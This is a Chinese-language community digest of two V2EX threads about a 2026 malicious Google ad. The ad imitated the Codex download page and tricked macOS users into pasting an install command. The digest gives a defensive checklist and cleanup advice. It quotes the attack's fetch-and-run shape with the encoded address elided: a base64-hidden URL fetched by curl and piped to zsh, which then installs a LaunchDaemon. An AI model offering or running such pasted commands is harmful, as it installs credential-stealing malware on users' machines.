摘要

状态：历史事件（2026 年上半年）。维护者 维护人 于 2026-10-21 裁定标为 stale：此后 4 个多月无新案例；防护建议仍可参考。

2026 年 5–6 月，至少两名 V2EX 用户在 Google 搜索 “Codex / codex app” 时，点进排第一的赞助广告——一个托管在 Google Sites、外观与 ChatGPT/Codex 官网一模一样的页面——按提示在 macOS 终端粘贴了一条“安装命令”。命令用 base64 隐藏真实地址，下载的脚本会先回连上报“有人中招”，再落地一个二进制并注册 LaunchDaemon 开机自启，疑似窃取 cookies、账号密码和加密货币信息。这是典型的 “恶意广告 + 复制命令自安装（ClickFix 变种）” 攻击：利用了 curl | sh 安装方式的普及、Google 域名带来的信任，以及按访客动态下发恶意内容来规避审核。社区共识：AI 工具只从官网直链或应用商店下载；不执行看不懂的粘贴命令；装广告拦截。

来龙去脉

受害者一（2026-05-11）（t/1212003↗）

  • 楼主在 Claude Code 里用的模型不顺手，想换 Codex，于是“去 google 搜 codex 官网，下载 codex 试试的”t/1212003↗，点进第一个结果，“与 chatgpt 的页面一毛一样”t/1212003↗。
  • 页面给出的安装命令以 echo "Downloading Codex: https://chatgpt.com/codex-app/Codex.dmg" 伪装，后接 curl -s $(echo "…" | openssl base64 -d -A) | zsh；“这个脚本各种混淆，以及 echo 复杂。。翻译了好半天才找到位置”t/1212003↗。
  • 执行后“提示我输入密码，我输入后在/Library/LaunchDaemons 中增加一个启动项”t/1212003↗，每秒拉起一次伪装成 AccountsHelper 的二进制；楼主用 Gemini 分析认为它“在不断获取cookies 、账号密码加密货币等信息”t/1212003↗。
  • 补充：“走的代理，区域是香港。 这个域名还是 business.google.com 第一眼看是 google 的域名，也就点进去了”t/1212003 #2 ❤1↗。

受害者二（2026-06-01）（t/1216995↗）

  • 搜索 “codex app”，“第一条没看到是赞助商广告”t/1216995↗，以为是 OpenAI 新出的命令行一键安装方式。
  • 处置：“换了常用的账号密码，开启了 2FA 验证了”t/1216995 #12↗；所幸“我当时 cURL 请求失败了，应该被公司的安全规则拦截掉了”t/1216995 #13↗。

各方观点

① “复制命令自安装”这种分发方式本身就危险（最高赞）

  • “我一直觉得这种复制一个命令，让用户自己来安装软件的方式，对用户非常危险”t/1212003 #7 ❤18↗
  • “这种通过 curl -> bash 的安装方式，对用户太危险了，使用这种方式的厂商也很不负责任”t/1216995 #18↗
  • 还有人遇到同类问题：“homebrew 安装命令 Google 上搜了第一条没仔细看，贴进去运行了才发现命令里有一段 Base64 是有问题的”t/1216995 #9↗

② 搜索广告平台难辞其咎

  • “这种套路都很久了，已经至少有三五年了”t/1212003 #44 ❤5↗，并解释“根据后台判定是不是要搞你”t/1212003 #44 ❤5↗，审核人员访问看到的是正常下载（❤5）
  • “google 搜出来竞价病毒： 大家警惕避雷”t/1212003 #13 ❤13↗——讽刺对 Google 与百度的双重标准（❤13）
  • “为啥谷歌投放广告的入口却没有 AI 筛查，就不得而知了。”t/1212003 #11↗

③ 装广告拦截就能避免

  • “从来没看到过赞助商广告，不知道是区域不同，还是 adguard 或者 UBlock 过滤了”t/1212003 #1 ❤1↗
  • “对于这个案例就是“记得开广告屏蔽扩展””t/1216995 #10↗
  • 反思：“攻击的人只需要成功一次，而防守的人只要疏忽一次。”t/1216995 #7↗

比例：讨论基本一致，没有人为这类广告辩护；分歧只在于把责任更多归给“curl | sh 分发习惯”还是“广告平台审核”。

实用建议 / 检查清单

个人

  • AI 工具（Codex、Claude Code 等）从官网直链、官方文档或 App Store 安装，不通过搜索广告进入（t/1212003↗、t/1216995↗）。
  • **看到 base64、| sh、| zsh 的粘贴命令先停下**；先解码看清楚下载地址再决定（t/1212003↗、t/1216995 #9↗）。
  • 安装脚本要求输入系统密码时提高警惕：“只要没输入密码就行，这个脚本需要输入密码”t/1216995 #12↗
  • 装 uBlock Origin / AdGuard 等广告拦截（t/1212003 #5↗、t/1216995 #16↗）。
  • 中招后：断网，检查 /Library/LaunchDaemons 与 ~/Library/Application Support 下的可疑隐藏目录，轮换浏览器中保存的密码与会话、开启 2FA，加密钱包视为已泄露（归纳自 t/1212003↗、t/1216995 #12↗）。可考虑装 Microsoft Defender for Mac（t/1212003 #61 ❤1↗）。

组织（归纳）

  • 出口网关/EDR 拦截可疑 curl 下载在第二起事件中起了作用（t/1216995 #13↗），值得作为安全意识培训案例。
  • 开发者常用工具应提供内部可信的安装渠道，减少员工自行搜索下载。

未定论与局限

  • 二进制的具体行为只是楼主借助 AI 的初步分析，没有完整的逆向报告。
  • 楼主一度认为“昨天这个推广页被黑了”t/1212003↗，而 #44 认为这类页面本来就是恶意的——两种说法帖内没有定论。
  • “100 万次点击”来自广告页面上的标注，不代表实际受害人数。
  • 是否只影响 macOS、是否存在 Windows 版本，帖内没有信息。
